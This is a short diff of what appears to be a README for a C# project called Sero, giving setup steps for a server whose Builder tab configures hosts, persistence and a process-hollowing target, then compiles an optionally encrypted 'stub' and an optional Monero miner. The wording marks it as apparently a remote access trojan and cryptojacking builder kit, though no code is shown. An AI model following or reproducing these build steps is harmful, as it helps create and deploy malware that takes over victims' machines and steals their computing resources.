@@ -60,7 +60,7 @@ Or open `Sero.sln` in Visual Studio 2022 and press `F6`.
 
 1. Launch `SeroServer.exe`
 2. Go to the **Builder** tab
-3. Configure hosts, auth key, persistence, hollow target
+3. Configure hosts, persistence, hollow target
 4. Click **Build** — the stub is compiled with NativeAOT and optionally crypted
 
 ### Step 4 — Build the XMR miner (optional)
